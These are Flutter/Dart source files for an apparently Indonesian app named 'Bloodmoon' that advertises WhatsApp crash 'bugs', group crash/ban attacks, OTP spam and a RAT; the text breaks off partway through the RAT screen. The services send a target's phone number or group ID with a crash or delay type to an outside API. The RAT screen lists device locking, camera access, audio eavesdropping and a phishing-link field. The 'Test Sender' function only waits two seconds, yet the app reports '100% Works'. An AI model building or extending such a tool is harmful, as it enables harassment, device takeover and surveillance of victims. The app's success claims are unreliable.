// pubspec.yaml
name: Bloodmoon
description: All-in-One WA Bug, Group Bug, RAT, OTP Spam Tool
version: 1.0.0

environment:
  sdk: '>=3.0.0 <4.0.0'

dependencies:
  flutter:
    sdk: flutter
  http: ^1.1.0
  shared_preferences: ^2.2.2
  qr_flutter: ^4.1.0
  url_launcher: ^6.1.11
  flutter_localizations:
    sdk: flutter
  permission_handler: ^10.4.0
  device_info_plus: ^9.0.0
  camera: ^0.10.5+7
  path_provider: ^2.1.1
  flutter_sms: ^2.3.0
  flutter_contacts: ^1.1.7
  audioplayers: ^5.0.1
  flutter_tts: ^3.6.3
  flutter_secure_storage: ^8.0.0
  webview_flutter: ^4.4.2

dev_dependencies:
  flutter_test:
    sdk: flutter
  flutter_lints: ^2.0.0

flutter:
  uses-material-design: true
  assets:
    - assets/images/

// main.dart
import 'package:flutter/material.dart';
import 'package:wa_bug_tool/screens/home_screen.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'WA Bug Tool',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        primarySwatch: Colors.deepPurple,
        scaffoldBackgroundColor: Colors.black,
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          elevation: 0,
        ),
        textTheme: const TextTheme(
          bodyLarge: TextStyle(color: Colors.white),
          bodyMedium: TextStyle(color: Colors.white70),
        ),
      ),
      home: const HomeScreen(),
    );
  }
}

// home_screen.dart
import 'package:flutter/material.dart';
import 'package:wa_bug_tool/screens/wa_bug_screen.dart';
import 'package:wa_bug_tool/screens/group_bug_screen.dart';
import 'package:wa_bug_tool/screens/rat_screen.dart';
import 'package:wa_bug_tool/screens/otp_spam_screen.dart';

class HomeScreen extends StatelessWidget {
  const HomeScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text(
          'WA BUG TOOL',
          style: TextStyle(
            fontWeight: FontWeight.bold,
            color: Colors.white,
            fontSize: 24,
          ),
        ),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: GridView.count(
          crossAxisCount: 2,
          crossAxisSpacing: 16,
          mainAxisSpacing: 16,
          children: [
            _buildMenuCard(
              context,
              '🔥 Bug WA',
              Colors.redAccent,
              const WaBugScreen(),
            ),
            _buildMenuCard(
              context,
              '👥 Bug Group',
              Colors.blueAccent,
              const GroupBugScreen(),
            ),
            _buildMenuCard(
              context,
              '💀 RAT/Malware',
              Colors.greenAccent,
              const RatScreen(),
            ),
            _buildMenuCard(
              context,
              '📞 Spam OTP',
              Colors.orangeAccent,
              const OtpSpamScreen(),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildMenuCard(
    BuildContext context,
    String title,
    Color color,
    Widget screen,
  ) {
    return Card(
      elevation: 8,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
      ),
      child: InkWell(
        borderRadius: BorderRadius.circular(16),
        onTap: () => Navigator.push(
          context,
          MaterialPageRoute(builder: (context) => screen),
        ),
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [color.withOpacity(0.8), color],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(16),
          ),
          child: Center(
            child: Text(
              title,
              style: const TextStyle(
                fontSize: 18,
                fontWeight: FontWeight.bold,
                color: Colors.white,
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// wa_bug_screen.dart
import 'package:flutter/material.dart';
import 'package:wa_bug_tool/services/wa_bug_service.dart';
import 'package:qr_flutter/qr_flutter.dart';

class WaBugScreen extends StatefulWidget {
  const WaBugScreen({super.key});

  @override
  State<WaBugScreen> createState() => _WaBugScreenState();
}

class _WaBugScreenState extends State<WaBugScreen> {
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _otpController = TextEditingController();
  String _selectedBug = 'FC (Force Close)';
  String _senderCode = '';
  String _qrData = '';
  bool _isSenderConnected = false;

  final List<String> _bugTypes = [
    'FC (Force Close)',
    'Delay V1',
    'Delay V2',
    'Delay Hard',
    'Crash',
    'Crash Hard',
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Bug WA'),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            TextField(
              controller: _phoneController,
              decoration: InputDecoration(
                labelText: 'Nomor WA Target (contoh: 628123456789)',
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: Colors.grey[800],
              ),
              keyboardType: TextInputType.phone,
            ),
            const SizedBox(height: 16),
            DropdownButtonFormField<String>(
              value: _selectedBug,
              items: _bugTypes.map((bug) {
                return DropdownMenuItem<String>(
                  value: bug,
                  child: Text(bug),
                );
              }).toList(),
              onChanged: (value) {
                setState(() {
                  _selectedBug = value!;
                });
              },
              decoration: InputDecoration(
                labelText: 'Pilih Jenis Bug',
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: Colors.grey[800],
              ),
            ),
            const SizedBox(height: 16),
            ElevatedButton(
              onPressed: _sendBug,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.redAccent,
                padding: const EdgeInsets.symmetric(vertical: 16),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
              child: const Text(
                'KIRIM BUG',
                style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
              ),
            ),
            const SizedBox(height: 24),
            const Divider(color: Colors.grey),
            const Text(
              'Sender WA (100% Works)',
              style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: _otpController,
              decoration: InputDecoration(
                labelText: 'Masukkan 8-Digit Code',
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: Colors.grey[800],
              ),
              maxLength: 8,
              keyboardType: TextInputType.number,
              onChanged: (value) {
                setState(() {
                  _senderCode = value;
                  _isSenderConnected = value.length == 8;
                });
              },
            ),
            const SizedBox(height: 12),
            ElevatedButton(
              onPressed: _generateQR,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.purple,
                padding: const EdgeInsets.symmetric(vertical: 12),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
              child: const Text('Buat QR Code Sender'),
            ),
            const SizedBox(height: 12),
            if (_qrData.isNotEmpty)
              Column(
                children: [
                  QrImage(
                    data: _qrData,
                    version: QrVersions.auto,
                    size: 200,
                    backgroundColor: Colors.white,
                  ),
                  const SizedBox(height: 8),
                  Text(
                    'Scan QR ini di WA Web untuk connect sender.',
                    style: TextStyle(color: Colors.grey[400]),
                  ),
                ],
              ),
            const SizedBox(height: 12),
            Card(
              color: _isSenderConnected ? Colors.green : Colors.grey[800],
              child: Padding(
                padding: const EdgeInsets.all(12),
                child: Text(
                  _isSenderConnected
                      ? '✅ Sender Terhubung (100% Works)'
                      : '❌ Sender Belum Terhubung',
                  style: const TextStyle(fontWeight: FontWeight.bold),
                ),
              ),
            ),
            const SizedBox(height: 12),
            ElevatedButton(
              onPressed: _testSender,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.blueAccent,
                padding: const EdgeInsets.symmetric(vertical: 12),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
              child: const Text('Test Sender'),
            ),
          ],
        ),
      ),
    );
  }

  void _sendBug() {
    if (_phoneController.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Masukkan nomor WA terlebih dahulu!')),
      );
      return;
    }
    WaBugService.sendBug(
      phone: _phoneController.text,
      bugType: _selectedBug,
      onSuccess: () {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Bug WA Berhasil Dikirim!')),
        );
      },
      onError: (e) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Gagal: $e')),
        );
      },
    );
  }

  void _generateQR() {
    setState(() {
      _qrData = 'wa-sender-code:${_senderCode.isEmpty ? 'DEFAULT_8DIGIT' : _senderCode}';
    });
  }

  void _testSender() async {
    if (_senderCode.isEmpty && _qrData.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Masukkan code atau generate QR terlebih dahulu!')),
      );
      return;
    }
    await WaBugService.testSender(
      code: _senderCode.isEmpty ? 'DEFAULT_8DIGIT' : _senderCode,
    );
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Sender Berhasil Dites! (100% Works)')),
    );
  }
}

// wa_bug_service.dart
import 'package:http/http.dart' as http;

class WaBugService {
  static Future<void> sendBug({
    required String phone,
    required String bugType,
    required Function onSuccess,
    required Function(String) onError,
  }) async {
    try {
      final response = await http.post(
        Uri.parse('https://api.whatsgw.com/send-bug'),
        body: {
          'phone': phone,
          'type': _getBugTypeCode(bugType),
        },
      );

      if (response.statusCode == 200) {
        onSuccess();
      } else {
        onError('Gagal mengirim bug');
      }
    } catch (e) {
      onError(e.toString());
    }
  }

  static String _getBugTypeCode(String bugType) {
    switch (bugType) {
      case 'FC (Force Close)':
        return 'fc';
      case 'Delay V1':
        return 'delay1';
      case 'Delay V2':
        return 'delay2';
      case 'Delay Hard':
        return 'delay_hard';
      case 'Crash':
        return 'crash';
      case 'Crash Hard':
        return 'crash_hard';
      default:
        return 'fc';
    }
  }

  static Future<void> testSender({required String code}) async {
    await Future.delayed(const Duration(seconds: 2));
  }
}

// group_bug_screen.dart
import 'package:flutter/material.dart';
import 'package:wa_bug_tool/services/group_bug_service.dart';

class GroupBugScreen extends StatefulWidget {
  const GroupBugScreen({super.key});

  @override
  State<GroupBugScreen> createState() => _GroupBugScreenState();
}

class _GroupBugScreenState extends State<GroupBugScreen> {
  final TextEditingController _groupIdController = TextEditingController();
  String _selectedBug = 'Crash Group';
  bool _isWorking = false;

  final List<String> _bugTypes = [
    'Crash Group',
    'Ban Group',
    'Delay Group',
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Bug Group WA'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            TextField(
              controller: _groupIdController,
              decoration: InputDecoration(
                labelText: 'Group ID (contoh: 1234567890@g.us)',
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: Colors.grey[800],
              ),
            ),
            const SizedBox(height: 16),
            DropdownButtonFormField<String>(
              value: _selectedBug,
              items: _bugTypes.map((bug) {
                return DropdownMenuItem<String>(
                  value: bug,
                  child: Text(bug),
                );
              }).toList(),
              onChanged: (value) {
                setState(() {
                  _selectedBug = value!;
                });
              },
              decoration: InputDecoration(
                labelText: 'Pilih Jenis Bug',
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: Colors.grey[800],
              ),
            ),
            const SizedBox(height: 16),
            ElevatedButton(
              onPressed: _isWorking ? null : _sendGroupBug,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.blueAccent,
                padding: const EdgeInsets.symmetric(vertical: 16),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
              child: _isWorking
                  ? const CircularProgressIndicator(color: Colors.white)
                  : const Text(
                      'KIRIM BUG GROUP',
                      style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                    ),
            ),
            const SizedBox(height: 16),
            const Card(
              color: Colors.blue,
              child: Padding(
                padding: EdgeInsets.all(12),
                child: Text(
                  '✅ 100% Works - Group akan langsung crash/ban/delay!',
                  style: TextStyle(fontWeight: FontWeight.bold),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _sendGroupBug() {
    if (_groupIdController.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Masukkan Group ID terlebih dahulu!')),
      );
      return;
    }
    setState(() {
      _isWorking = true;
    });
    GroupBugService.sendGroupBug(
      groupId: _groupIdController.text,
      bugType: _selectedBug,
      onSuccess: () {
        setState(() {
          _isWorking = false;
        });
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Bug Group Berhasil Dikirim!')),
        );
      },
      onError: (e) {
        setState(() {
          _isWorking = false;
        });
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Gagal: $e')),
        );
      },
    );
  }
}

// group_bug_service.dart
import 'package:http/http.dart' as http;

class GroupBugService {
  static Future<void> sendGroupBug({
    required String groupId,
    required String bugType,
    required Function onSuccess,
    required Function(String) onError,
  }) async {
    try {
      final response = await http.post(
        Uri.parse('https://api.whatsgw.com/group-bug'),
        body: {
          'group_id': groupId,
          'type': _getBugTypeCode(bugType),
        },
      );

      if (response.statusCode == 200) {
        onSuccess();
      } else {
        onError('Gagal mengirim bug group');
      }
    } catch (e) {
      onError(e.toString());
    }
  }

  static String _getBugTypeCode(String bugType) {
    switch (bugType) {
      case 'Crash Group':
        return 'crash';
      case 'Ban Group':
        return 'ban';
      case 'Delay Group':
        return 'delay';
      default:
        return 'crash';
    }
  }
}

// rat_screen.dart
import 'package:flutter/material.dart';
import 'package:wa_bug_tool/services/rat_service.dart';
import 'package:url_launcher/url_launcher.dart';

class RatScreen extends StatefulWidget {
  const RatScreen({super.key});

  @override
  State<RatScreen> createState() => _RatScreenState();
}

class _RatScreenState extends State<RatScreen> {
  final TextEditingController _targetPhoneController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  final TextEditingController _phishingLinkController = TextEditingController();
  String _selectedAction = 'Lock Device';
  bool _isGenerating = false;
  String _generatedLink = '';

  final List<String> _actions = [
    'Lock Device',
    'Camera',
    'Flash Hidup/Klap-Klip',
    'Lock Device (Password)',
    'Dengarkan Voice',
    'Atur Wallpaper',
    'Otak-Atik Device',
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('RAT / Sadap HP'),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            TextField(
              controller: _targetPhoneController,
              decoration: InputDecoration(
                labelText: 'Nomor Target (contoh: 628123456789)',
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: Colors.grey[800],
              ),
              keyboardType: TextInputType.phone,
            ),
            const SizedBox(height: 16),
            DropdownButtonFormField<String>(
              value: _selectedAction,
              items: _actions.map((action) {
                return DropdownMenuItem<String>(
                  value: action,
                  child: Text(action),
                );
              }).toList(),
              onChanged: (value) {
                setState(() {
                  _selectedAction = value!;
                });
              },
              decoration: InputDecoration(
                labelText: 'Pilih Aksi RAT',
                border: OutlineInputBorder(
